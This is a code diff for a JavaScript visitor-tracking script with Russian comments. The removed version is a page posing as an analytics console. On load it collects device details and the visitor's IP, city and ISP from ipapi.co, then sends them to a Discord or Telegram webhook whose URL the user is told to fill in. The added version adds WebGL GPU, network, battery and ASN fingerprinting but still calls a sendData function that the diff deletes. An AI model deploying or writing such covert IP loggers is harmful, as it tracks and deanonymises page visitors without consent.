@@ -1,141 +1,102 @@
-<!DOCTYPE html>
-<html lang="ru">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Console Data Analytics</title>
-    <style>
-        body {
-            background-color: #0d1117;
-            color: #58a6ff;
-            font-family: 'Courier New', Courier, monospace;
-            padding: 20px;
-            margin: 0;
-        }
-        .terminal {
-            max-width: 800px;
-            margin: 0 auto;
-            background: #161b22;
-            border: 1px solid #30363d;
-            border-radius: 6px;
-            padding: 20px;
-            box-shadow: 0 4px 12px rgba(0,0,0,0.5);
-        }
-        .header {
-            color: #8b949e;
-            border-bottom: 1px solid #30363d;
-            padding-bottom: 10px;
-            margin-bottom: 20px;
-            font-size: 14px;
-        }
-        .status {
-            color: #ff7b72;
-            font-weight: bold;
-        }
-        .success {
-            color: #7ee787;
-        }
-        pre {
-            background: #0d1117;
-            padding: 15px;
-            border-radius: 4px;
-            border: 1px solid #21262d;
-            overflow-x: auto;
-            color: #c9d1d9;
-        }
-    </style>
-</head>
-<body>
+async function collectMetrics() {
+    const report = {
+        timestamp: new Date().toISOString(),
+        
+        // Базовая инфо
+        userAgent: navigator.userAgent,
+        language: navigator.language,
+        referrer: document.referrer || "Прямой переход",
+        
+        // Время и локализация
+        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+        timezoneOffset: new Date().getTimezoneOffset(),
 
-<div class="terminal">
-    <div class="header">> Инициализация модуля аналитики логов...</div>
-    <p>Статус: <span id="status" class="status">Сбор логов устройства...</span></p>
-    
-    <h3>Сформированный пакет данных (JSON):</h3>
-    <pre id="output">Ожидание ответа от сенсоров...</pre>
-</div>
+        // Экран и интерфейс
+        screen: {
+            width: window.screen.width,
+            height: window.screen.height,
+            availWidth: window.screen.availWidth,
+            availHeight: window.screen.availHeight,
+            colorDepth: window.screen.colorDepth,
+            pixelRatio: window.devicePixelRatio || 1
+        },
 
-<script>
-    async function collectMetrics() {
-        // 1. Собираем внутренние параметры браузера и устройства
-        const report = {
-            timestamp: new Date().toISOString(),
-            userAgent: navigator.userAgent,
-            platform: navigator.platform || (navigator.userAgentData ? navigator.userAgentData.platform : "Unknown"),
-            language: navigator.language,
-            screen: {
-                width: window.screen.width,
-                height: window.screen.height,
-                colorDepth: window.screen.colorDepth
-            },
-            hardware: {
-                cores: navigator.hardwareConcurrency || "N/A",
-                ram: navigator.deviceMemory || "N/A" // Работает не во всех браузерах
-            },
-            context: {
-                referrer: document.referrer || "Прямой переход",
-                href: window.location.href
-            }
+        // Железо и ресурсы
+        hardware: {
+            cores: navigator.hardwareConcurrency || "N/A",
+            ram: navigator.deviceMemory || "N/A",
+            maxTouchPoints: navigator.maxTouchPoints || 0 // 0 = нет тачскрина
+        },
+
+        // Конфиденциальность
+        privacy: {
+            doNotTrack: navigator.doNotTrack || "N/A",
+            cookiesEnabled: navigator.cookieEnabled
+        }
+    };
+
+    // 1. Получаем данные о видеокарте через WebGL
+    try {
+        const canvas = document.createElement('canvas');
+        const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+        if (gl) {
+            const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+            report.graphics = {
+                vendor: gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL),
+                renderer: gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL)
+            };
+        } else {
+            report.graphics = { status: "WebGL не поддерживается" };
+        }
+    } catch (e) {
+        report.graphics = { status: "Заблокировано/Ошибка" };
+    }
+
+    // 2. Получаем параметры сети (скорость, тип подключения)
+    const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+    if (conn) {
+        report.networkSpeed = {
+            effectiveType: conn.effectiveType, // '4g', '3g', '2g'
+            downlink: conn.downlink,           // Скорость в Мбит/с
+            rtt: conn.rtt                      // Задержка (ping) в мс
         };
+    }
 
-        // 2. Делаем запрос к внешнему API для получения IP и локации
+    // 3. Получаем статус батареи (работает асинхронно)
+    if (typeof navigator.getBattery === 'function') {
         try {
-            const response = await fetch('https://ipapi.co/json/');
-            if (response.ok) {
-                const geo = await response.json();
-                report.network = {
-                    ip: geo.ip,
-                    country: geo.country_name,
-                    region: geo.region,
-                    city: geo.city,
-                    provider: geo.org
-                };
-            }
-        } catch (error) {
-            report.network = {
-                error: "Не удалось определить IP (заблокировано AdBlock или нет сети)"
+            const battery = await navigator.getBattery();
+            report.battery = {
+                charging: battery.charging,
+                level: Math.round(battery.level * 100) + '%'
+            };
+        } catch (e) {
+            report.battery = { status: "Доступ запрещен браузером" };
+        }
+    }
+
+    // 4. Запрос IP и Гео (внешний API)
+    try {
+        const response = await fetch('https://ipapi.co/json/');
+        if (response.ok) {
+            const geo = await response.json();
+            report.geo = {
+                ip: geo.ip,
+                country: geo.country_name,
+                region: geo.region,
+                city: geo.city,
+                asn: geo.asn, // Номер автономной системы (провайдера)
+                org: geo.org
             };
         }
-
-        // Выводим собранный лог на экран
-        document.getElementById('output').textContent = JSON.stringify(report, null, 4);
-        
-        const statusEl = document.getElementById('status');
-        statusEl.textContent = "Данные успешно агрегированы.";
-        statusEl.className = "success";
-
-        // 3. Передача собранных данных на внешний сервер
-        sendData(report);
+    } catch (error) {
+        report.geo = { error: "Не удалось получить IP" };
     }
 
-    function sendData(payload) {
-        // Вставь сюда URL своего вебхука (например, от Discord или Telegram-бота)
-        const webhookUrl = 'ЗАМЕНИ_НА_ТВОЙ_WEBHOOK_URL';
+    // Вывод в консоль и на страницу
+    console.log("Сформированный отпечаток устройства:", report);
+    document.getElementById('output').textContent = JSON.stringify(report, null, 4);
 
-        if (webhookUrl.startsWith('ЗАМЕНИ_')) {
-            console.log("Данные готовы к отправке. Настройте webhookUrl в коде скрипта.");
-            return;
-        }
-
-        // Пример отправки структуры данных в Discord Webhook
-        fetch(webhookUrl, {
-            method: 'POST',
-            headers: {
-                'Content-Type': 'application/json'
-            },
-            body: JSON.stringify({
-                embeds: [{
-                    title: "Зафиксирован просмотр страницы",
-                    color: 5814783,
-                    description: `\`\`\`json\n${JSON.stringify(payload, null, 2).substring(0, 1900)}\n\`\`\``
-                }]
-            })
-        }).catch(err => console.error("Ошибка при логировании на сервер:", err));
-    }
-
-    // Запуск процесса при полной загрузке DOM дерева
-    window.addEventListener('DOMContentLoaded', collectMetrics);
-</script>
-
-</body>
-</html>
+    // Отправка (вызов твоей функции отправки)
+    sendData(report);
+}
